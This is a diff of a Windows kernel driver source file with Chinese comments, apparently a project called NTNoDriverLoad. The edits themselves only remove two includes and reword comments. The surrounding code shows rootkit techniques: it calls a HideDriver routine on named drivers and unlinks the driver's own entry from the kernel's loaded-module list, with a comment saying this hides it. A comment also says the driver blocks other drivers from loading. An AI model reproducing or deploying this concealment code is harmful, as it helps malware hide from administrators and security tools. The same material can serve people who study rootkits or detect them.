@@ -1,6 +1,4 @@
 #include <ntifs.h>
-#include <ntddk.h>
-#include <devioctl.h>
 #ifndef _NTNoDriverLoad_H
 #define _NTNoDriverLoad_H "NTNoDriverLoad"
 #endif
@@ -32,9 +30,9 @@ typedef struct _KLDR_DATA_TABLE_ENTRY
 
 typedef struct _LDR_DATA_TABLE_ENTRY
 {
-	LIST_ENTRY InLoadOrderLinks;//这个成员把系统所有加载(可能是停止没被卸载)已经读取到内存中 我们关系第一个  我们要遍历链表 双链表 不管中间哪个节点都可以遍历整个链表 本驱动的驱动对象就是一个节点
-	LIST_ENTRY InMemoryOrderLinks;//系统已经启动 没有被初始化 没有调用DriverEntry这个历程的时候 通过这个链表进程串接起来
-	LIST_ENTRY InInitializationOrderLinks;//已经调用DriverEntry这个函数的所有驱动程序
+	LIST_ENTRY InLoadOrderLinks;//这个成员把系统所有加载（可能是停止没被卸载）已经读取到内存中
+	LIST_ENTRY InMemoryOrderLinks;//系统已经启动但没有被初始化，没有调用 DriverEntry 这个历程的时候，通过这个链表进程串接起来
+	LIST_ENTRY InInitializationOrderLinks;//已经调用 DriverEntry 这个函数的所有驱动程序
 	PVOID DllBase;
 	PVOID EntryPoint;//驱动的进入点 DriverEntry
 	ULONG SizeOfImage;
@@ -166,7 +164,7 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObject, IN PUNICODE_STRING Registr
 	RtlInitUnicodeString(&(targets[1]), L"ZwDeleteFile.sys");
 	HideDriver(pDriverObject, targets, 2);
 	
-	/* 操作 */
+	/* 本驱动隐藏和阻止加载操作 */
 	PKLDR_DATA_TABLE_ENTRY list = (PKLDR_DATA_TABLE_ENTRY)pDriverObject->DriverSection;//声明必要结构 list 获取自身对象结构
 	*((ULONGLONG*)list->InLoadOrderLinks.Blink) = list->InLoadOrderLinks.Flink;//断链操作，上一个对象等于下一个，下一个等于上一个对象，达到把自己隐藏起来的目的
 	((LIST_ENTRY64*)list->InLoadOrderLinks.Flink)->Blink = list->InLoadOrderLinks.Blink;
